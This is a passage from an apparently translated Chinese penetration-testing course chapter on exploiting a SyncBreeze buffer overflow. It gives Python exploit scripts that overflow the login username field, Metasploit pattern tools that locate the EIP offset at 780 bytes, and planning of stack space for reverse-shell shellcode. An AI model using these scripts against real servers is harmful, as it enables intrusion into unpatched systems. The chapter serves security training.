

列表 345 - 复现缓冲区溢出

当执行此脚本时，会导致类似于我们之前观察到的访问冲突。换句话说，我们能够一致地复现崩溃。这是一个良好的第一步。

## 11.2.3 控制 EIP

在利用内存损坏漏洞时，获取 EIP 寄存器的控制权是关键步骤。EIP 寄存器类似于马的缰绳；我们可以用它来控制应用程序的方向或流程。然而，此时我们只知道缓冲区中由 A 组成的某个未知部分覆盖了 EIP，如图 213 所示：

![](img/ec25e59d75726b7041242a56d3376832_378_0.png)

图 213：EIP 被 A 覆盖

在我们能够将有效的目标地址加载到指令指针并控制执行流程之前，我们需要确切知道我们缓冲区的哪一部分落在 EIP 中。

有两种常见的方法可以做到这一点。首先，我们可以尝试*二叉树分析*。不用发送 800 个 A，而是发送 400 个 A 和 400 个 B。如果 EIP 被 B 覆盖，我们就知道这四个字节位于缓冲区的后半部分。然后我们将 400 个 B 改为 200 个 B 和 200 个 C，并再次发送缓冲区。如果 EIP 被 C 覆盖，我们就知道这四个字节位于 600–800 字节范围内。我们继续分割特定的缓冲区，直到找到确切覆盖 EIP 的四个字节。从数学上讲，这应该在七次迭代中完成。

然而，有一种更快的方法来识别这四个字节的位置。我们可以使用一个足够长的、由不重复的 4 字节块组成的字符串作为我们的模糊测试输入。然后，当 EIP 被我们字符串中的 4 个字节覆盖时，我们可以使用它们的唯一序列来精确定位它们在输入缓冲区中的位置。虽然起初这可能有点难以理解，但当我们要应用该技术时，它会变得清晰明了。

我们将使用 Metasploit 的 pattern_create.rb Ruby 脚本来帮助我们实现这种方法。pattern_create.rb 脚本位于 /usr/share/metasploit-framework/tools/exploit/，但可以在 Kali 中的任何位置通过运行 msf-pattern_create 来执行，如下所示：

```text
kali@kali:~$ locate pattern_create
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb

kali@kali:~$ msf-pattern_create -h
Usage: msf-pattern_create [options]
Example: msf-pattern_create -l 50 -s ABC,def,123
Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

Options:
-l, --length <length>		The length of the pattern
-s, --sets <ABC,def,123>		Custom Pattern Sets
-h, --help			Show this message
```

列表 346 - msf-pattern_create 的位置和帮助用法

为了创建用于概念验证的字符串，我们传递 -l 参数，该参数定义了我们所需字符串的长度（800）：

```text
kali@kali:~$ msf-pattern_create -l 800
Aa0A1A2A3A4A5A6A7A8A9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5
A16A17A18A19Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak
...
```

列表 347 - 创建唯一字符串

下一步是更新我们的 Python 脚本，将现有的由 800 个 A 组成的缓冲区替换为这个新的唯一字符串：

```python
#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."

    inputBuffer = "Aa0A1Aa2A3A4A5A5Aa...1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"
    ...
```

列表 348 - 带有唯一字符串的更新缓冲区

当我们重启 SyncBreeze 并再次运行我们的漏洞利用程序时，我们注意到 EIP 包含一个新的字符串，类似于图 214 中所示的字符串：

![](img/ec25e59d75726b7041242a56d3376832_380_0.png)

图 214：EIP 被覆盖

EIP 寄存器已被 42306142 覆盖，这是四个字符 "B0aB" 的十六进制表示。知道了这一点，我们可以使用 pattern_create.rb 的配套工具 pattern_offset.rb 来确定这四个特定字节在我们字符串中的偏移量。在 Kali 中，此脚本可以通过 **msf-pattern_offset** 从任何位置运行。

为了找到发生 EIP 覆盖的偏移量，我们可以使用 -l 指定原始字符串的长度（在我们的情况下为 800），并使用 -q 指定我们在 EIP 中找到的字节（42306142）：

```text
kali@kali:~$ msf-pattern_offset -l 800 -q 42306142
[*] Exact match at offset 780
```

列表 349 - 查找偏移量

msf-pattern_offset 脚本报告说，这四个字节位于 800 字节模式的偏移量 780 处。让我们将此转换为新的修改后的缓冲区字符串，看看我们能否让四个 B（0x42424242）精确地落在 EIP 寄存器中：

```python
#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."

    filler = "A" * 780
    eip = "B" * 4
    buffer = "C" * 16

    inputBuffer = filler + eip + buffer

    content = "username=" + inputBuffer + "&password=A"
    ...
```

列表 350 - 更新的缓冲区字符串

这次，Web 服务器崩溃，生成的缓冲区结构完美，并且 EIP 现在包含我们的四个 B（0x42424242），如图 215 所示：

![](img/ec25e59d75726b7041242a56d3376832_381_0.png)

图 215. EIP 已受控

我们现在对 EIP 拥有完全控制权，并且应该能够有效控制 SyncBreeze 的执行流程！然而，我们需要替换我们的 0x42424242 占位符，并将应用程序流程重定向到我们想要执行的代码的有效地址。

### 11.2.3.1 练习

- 编写一个独立脚本来复现崩溃。
- 确定输入缓冲区内的偏移量以成功控制 EIP。
- 更新你的独立脚本，将唯一值放入 EIP 以确保你的偏移量是正确的。

### 11.2.4 定位 Shellcode 的空间

此时，我们知道我们可以在 EIP 中放置任意地址，但不知道使用什么实际地址。然而，在理解我们可以将执行流程重定向到哪里之前，我们无法选择一个地址。因此，我们将首先关注我们希望目标执行的代码，更重要的是，理解这些代码在内存中将适应在哪里。

理想情况下，我们希望目标执行我们选择的一些代码，例如反向 shell。我们可以将这样的 shellcode[^1] 作为触发崩溃的输入缓冲区的一部分。

> Shellcode 是一组汇编指令，当执行时，执行攻击者期望的操作。这通常是打开反向或绑定 shell，但也可能包括更复杂的操作。

我们将使用 Metasploit 框架来生成我们的 shellcode 有效载荷。回顾我们在图 215 中最后一次崩溃后的寄存器，我们注意到 ESP 寄存器指向我们由 C 组成的缓冲区。

由于我们可以通过存储在 ESP 中的地址轻松地在崩溃时访问此位置，这似乎是我们 shellcode 的方便位置。

[^1]: (Wikipedia, 2019), https://en.wikipedia.org/wiki/Shellcode

![](img/ec25e59d75726b7041242a56d3376832_382_0.png)

对崩溃时栈的仔细检查（列表 351）显示，我们缓冲区中的前四个 C 落在地址 0x01307460，而存储 0x01307464（图 215）的 ESP 指向我们缓冲区中的下一个四个 C：

| 地址    | 十六进制 |  ASCII  |
|------------|-------------|--------|
| 01307444   | 41414141    | AAAA   |
| 01307448   | 41414141    | AAAA   |
| 0130744C   | 41414141    | AAAA   |
| 01307450   | 41414141    | AAAA   |
| 01307454   | 41414141    | AAAA   |
| 01307458   | 41414141    | AAAA   |
| 0130745C   | 42424242    | BBBB   |
| 01307460   | 43434343    | CCCC   |
| 01307464   | 43434343    | CCCC   |
| 01307468   | 43434343    | CCCC   |
| 0130746C   | 43434343    | CCCC   |
| 01307470   | 00000000    |        |
| 01307474   | 00000000    |        |

列表 351 - ESP 指向 C’s

根据经验，我们知道标准的反向 shell 有效载荷大约需要 350–400 字节的内存空间。然而，上述列表清楚地显示缓冲区中只有十六个 C，这对于我们的 shellcode 来说远远不够。解决这个问题的最简单方法是尝试将漏洞利用程序中的缓冲区长度从 800 字节增加到 1500 字节，看看这是否允许足够的空间放置我们的 shellcode，而不破坏缓冲区溢出条件或改变崩溃的性质。

> 根据应用程序和漏洞类型，输入长度可能会受到限制。在某些情况下，增加缓冲区长度可能会导致完全不同的崩溃，因为较大的缓冲区会覆盖目标应用程序使用的堆栈上的额外数据。

对于此更新，我们将添加‘D’字符作为我们 shellcode 的占位符：

```python
...
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
...
```

列表 352 - 更新的 username 字符串

一旦发送了新的、更长的缓冲区，可以在调试器中观察到类似的崩溃。不过，这次我们发现 ESP 指向不同的地址值 0x030E745C，如图 216 所示：

